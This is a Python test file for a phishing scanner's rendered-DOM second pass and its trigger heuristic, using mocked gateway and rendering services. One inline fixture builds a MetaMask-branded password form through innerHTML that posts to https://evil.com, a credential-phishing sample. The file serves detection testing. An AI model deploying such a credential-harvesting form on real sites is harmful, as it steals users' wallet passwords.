"""Tests for rendered DOM two-pass scanning and _needs_rendered_scan heuristic."""
from __future__ import annotations

import tempfile
import os

import pytest
from unittest.mock import AsyncMock, MagicMock

from src.config import Settings
from src.db import ScannerDB, QueueRow
from src.gateway_client import GatewayClient
from src.metrics import ScanMetrics
from src.ml.features import parse_html
from src.models import ScanResult, Verdict
from src.rules.engine import RuleEngine
from src.scanner import Scanner, _needs_rendered_scan

from tests.fixtures import (
    CLEAN_HTML,
    JS_RENDERED_PHISHING_SHELL,
    JS_RENDERED_PHISHING_DOM,
    IFRAME_DATA_URI_PHISHING,
    IFRAME_SRCDOC_PHISHING,
)


def _settings(**overrides) -> Settings:
    defaults = dict(
        gateway_url="http://localhost:3000",
        admin_api_key="test-key",
        scanner_admin_key="admin-key",
        ml_model_enabled=False,
        scanner_mode="enforce",
        rendered_dom_scan_enabled=True,
    )
    defaults.update(overrides)
    return Settings(**defaults)


# --- Heuristic tests ---


class TestNeedsRenderedScan:
    def test_clean_with_dom_manipulation_and_sparse_content(self):
        """JS shell with innerHTML and little visible text -> needs render."""
        soup = parse_html(JS_RENDERED_PHISHING_SHELL)
        result = ScanResult(verdict=Verdict.CLEAN)
        assert _needs_rendered_scan(JS_RENDERED_PHISHING_SHELL, soup, result) is True

    def test_already_malicious_no_render(self):
        """Already flagged pages don't need re-scan."""
        soup = parse_html(JS_RENDERED_PHISHING_SHELL)
        result = ScanResult(verdict=Verdict.MALICIOUS)
        assert _needs_rendered_scan(JS_RENDERED_PHISHING_SHELL, soup, result) is False

    def test_no_scripts_no_render(self):
        """Page without scripts doesn't need render."""
        soup = parse_html(CLEAN_HTML)
        result = ScanResult(verdict=Verdict.CLEAN)
        assert _needs_rendered_scan(CLEAN_HTML, soup, result) is False

    def test_scripts_without_dom_manipulation_no_render(self):
        """Scripts that only log or do analytics don't need render."""
        html = """<html><body>
        <p>Hello world</p>
        <script>console.log("analytics loaded");</script>
        </body></html>"""
        soup = parse_html(html)
        result = ScanResult(verdict=Verdict.CLEAN)
        assert _needs_rendered_scan(html, soup, result) is False

    def test_rich_static_content_no_render(self):
        """Page with lots of visible text doesn't need render even with scripts."""
        html = """<html><body>
        <h1>My Blog</h1>
        <p>""" + "Lorem ipsum dolor sit amet. " * 50 + """</p>
        <div><p>More content</p></div>
        <div><p>Even more content</p></div>
        <div><p>Section 3</p></div>
        <div><p>Section 4</p></div>
        <div><p>Section 5</p></div>
        <div><p>Section 6</p></div>
        <div><p>Section 7</p></div>
        <div><p>Section 8</p></div>
        <script>document.body.innerHTML += '<footer>built with love</footer>';</script>
        </body></html>"""
        soup = parse_html(html)
        result = ScanResult(verdict=Verdict.CLEAN)
        assert _needs_rendered_scan(html, soup, result) is False

    def test_long_script_with_sparse_visible_content_triggers(self):
        """Page with long script but sparse visible text should still trigger.
        Regression: soup.get_text() was including script content in length check."""
        html = """<html><body>
        <div id="app"></div>
        <script>
        document.getElementById('app').innerHTML = '<h1>MetaMask</h1>' + '<form action="https://evil.com"><input type="password"></form>' + 'x'.repeat(500);
        </script>
        </body></html>"""
        soup = parse_html(html)
        result = ScanResult(verdict=Verdict.CLEAN)
        assert _needs_rendered_scan(html, soup, result) is True

    def test_suspicious_also_skipped(self):
        """SUSPICIOUS verdicts also skip render (already flagged)."""
        soup = parse_html(JS_RENDERED_PHISHING_SHELL)
        result = ScanResult(verdict=Verdict.SUSPICIOUS)
        assert _needs_rendered_scan(JS_RENDERED_PHISHING_SHELL, soup, result) is False


# --- Integration tests ---


class TestRenderedDomIntegration:
    async def test_rendered_scan_overrides_clean(self):
        """JS shell that renders phishing should be caught by two-pass scan."""
        s = _settings()
        fd, db_path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        db = ScannerDB(db_path)
        db.initialize()
        gateway = AsyncMock(spec=GatewayClient)
        gateway.fetch_content = AsyncMock(
            return_value=JS_RENDERED_PHISHING_SHELL.encode()
        )
        gateway.block_data = AsyncMock(return_value=True)
        engine = RuleEngine(s)
        metrics = ScanMetrics()

        # Mock screenshot service to return the rendered DOM
        mock_screenshot = MagicMock()
        mock_screenshot.available = True
        mock_screenshot.render_dom = AsyncMock(return_value=JS_RENDERED_PHISHING_DOM)
        mock_screenshot.capture = AsyncMock()

        scanner = Scanner(
            s, db, gateway, engine, metrics,
            screenshot=mock_screenshot,
        )

        item = QueueRow(
            id=1,
            tx_id="A" * 43,
            content_hash="hash123",
            content_type="text/html",
            data_size=1024,
            received_at=0,
        )
        await scanner.process_queue_item(item)

        # Rendered scan should have been called
        mock_screenshot.render_dom.assert_called_once()
        # Verdict should be MALICIOUS from rendered DOM
        cached = db.get_verdict("hash123")
        assert cached is not None
        assert cached.verdict == Verdict.MALICIOUS
        # Block should have been called
        gateway.block_data.assert_called_once()
        # Metrics should record the rendered scan
        assert metrics.rendered_dom_scans == 1
        assert metrics.rendered_dom_detections == 1

    async def test_rendered_scan_disabled_by_config(self):
        """Rendered scan should not run when disabled."""
        s = _settings(rendered_dom_scan_enabled=False)
        fd, db_path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        db = ScannerDB(db_path)
        db.initialize()
        gateway = AsyncMock(spec=GatewayClient)
        gateway.fetch_content = AsyncMock(
            return_value=JS_RENDERED_PHISHING_SHELL.encode()
        )
        engine = RuleEngine(s)
        metrics = ScanMetrics()

        mock_screenshot = MagicMock()
        mock_screenshot.available = True
        mock_screenshot.render_dom = AsyncMock()

        scanner = Scanner(
            s, db, gateway, engine, metrics,
            screenshot=mock_screenshot,
        )

        item = QueueRow(
            id=1,
            tx_id="A" * 43,
            content_hash="hash123",
            content_type="text/html",
            data_size=1024,
            received_at=0,
        )
        await scanner.process_queue_item(item)

        mock_screenshot.render_dom.assert_not_called()

    async def test_rendered_scan_clean_stays_clean(self):
        """If rendered DOM is also clean, verdict stays CLEAN."""
        s = _settings()
        fd, db_path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        db = ScannerDB(db_path)
        db.initialize()
        gateway = AsyncMock(spec=GatewayClient)
        gateway.fetch_content = AsyncMock(
            return_value=JS_RENDERED_PHISHING_SHELL.encode()
        )
        engine = RuleEngine(s)
        metrics = ScanMetrics()

        # Render returns clean content (no phishing in rendered DOM)
        mock_screenshot = MagicMock()
        mock_screenshot.available = True
        mock_screenshot.render_dom = AsyncMock(
            return_value="<html><body><p>Just a loading page</p></body></html>"
        )

        scanner = Scanner(
            s, db, gateway, engine, metrics,
            screenshot=mock_screenshot,
        )

        item = QueueRow(
            id=1,
            tx_id="A" * 43,
            content_hash="hash123",
            content_type="text/html",
            data_size=1024,
            received_at=0,
        )
        await scanner.process_queue_item(item)

        cached = db.get_verdict("hash123")
        assert cached is not None
        assert cached.verdict == Verdict.CLEAN
        assert metrics.rendered_dom_scans == 1
        assert metrics.rendered_dom_detections == 0

    async def test_iframe_phishing_detected(self):
        """Data URI iframe containing phishing should be detected."""
        s = _settings()
        fd, db_path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        db = ScannerDB(db_path)
        db.initialize()
        gateway = AsyncMock(spec=GatewayClient)
        gateway.fetch_content = AsyncMock(
            return_value=IFRAME_DATA_URI_PHISHING.encode()
        )
        gateway.block_data = AsyncMock(return_value=True)
        engine = RuleEngine(s)
        metrics = ScanMetrics()

        scanner = Scanner(s, db, gateway, engine, metrics)

        item = QueueRow(
            id=1,
            tx_id="A" * 43,
            content_hash="hash123",
            content_type="text/html",
            data_size=1024,
            received_at=0,
        )
        await scanner.process_queue_item(item)

        cached = db.get_verdict("hash123")
        assert cached is not None
        assert cached.verdict == Verdict.MALICIOUS
        gateway.block_data.assert_called_once()

    async def test_iframe_srcdoc_phishing_detected(self):
        """srcdoc iframe containing phishing should be detected."""
        s = _settings()
        fd, db_path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        db = ScannerDB(db_path)
        db.initialize()
        gateway = AsyncMock(spec=GatewayClient)
        gateway.fetch_content = AsyncMock(
            return_value=IFRAME_SRCDOC_PHISHING.encode()
        )
        gateway.block_data = AsyncMock(return_value=True)
        engine = RuleEngine(s)
        metrics = ScanMetrics()

        scanner = Scanner(s, db, gateway, engine, metrics)

        item = QueueRow(
            id=1,
            tx_id="A" * 43,
            content_hash="hash123",
            content_type="text/html",
            data_size=1024,
            received_at=0,
        )
        await scanner.process_queue_item(item)

        cached = db.get_verdict("hash123")
        assert cached is not None
        assert cached.verdict == Verdict.MALICIOUS

    async def test_rendered_rule_prefix(self):
        """Matched rules from rendered scan should have 'rendered:' prefix."""
        s = _settings()
        fd, db_path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        db = ScannerDB(db_path)
        db.initialize()
        gateway = AsyncMock(spec=GatewayClient)
        gateway.fetch_content = AsyncMock(
            return_value=JS_RENDERED_PHISHING_SHELL.encode()
        )
        gateway.block_data = AsyncMock(return_value=True)
        engine = RuleEngine(s)
        metrics = ScanMetrics()

        mock_screenshot = MagicMock()
        mock_screenshot.available = True
        mock_screenshot.render_dom = AsyncMock(return_value=JS_RENDERED_PHISHING_DOM)
        mock_screenshot.capture = AsyncMock()

        scanner = Scanner(
            s, db, gateway, engine, metrics,
            screenshot=mock_screenshot,
        )

        item = QueueRow(
            id=1,
            tx_id="A" * 43,
            content_hash="hash123",
            content_type="text/html",
            data_size=1024,
            received_at=0,
        )
        await scanner.process_queue_item(item)

        cached = db.get_verdict("hash123")
        import json
        rules = json.loads(cached.matched_rules)
        assert any(r.startswith("rendered:") for r in rules)
